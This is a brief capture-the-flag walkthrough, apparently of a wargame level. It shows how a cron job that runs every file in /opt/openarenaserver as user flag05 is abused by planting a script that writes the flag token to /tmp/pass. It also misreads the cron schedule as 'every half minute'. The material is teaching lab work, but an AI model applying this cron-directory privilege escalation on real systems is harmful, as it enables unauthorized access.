When connection we have a new mail.
Let's look what is inside: 'cd /var/mail'

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

We can understand this with these first caracter that it is a cronJob executing every half minute

Now we will take a look at the script in /usr/sbin/openarenaserver

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

Each file in /opt/openarenaserver is executed then deleted.

With the cronJob the file is executed as flag05 which means we can exploit this.

let's create a script in /opt/openarenaserver and wait a bit for the cronJob to execute it.

echo 'getflag > /tmp/pass' > /opt/openarenaserver/flag.sh

wait a bit and in /tmp/pass it should have the token
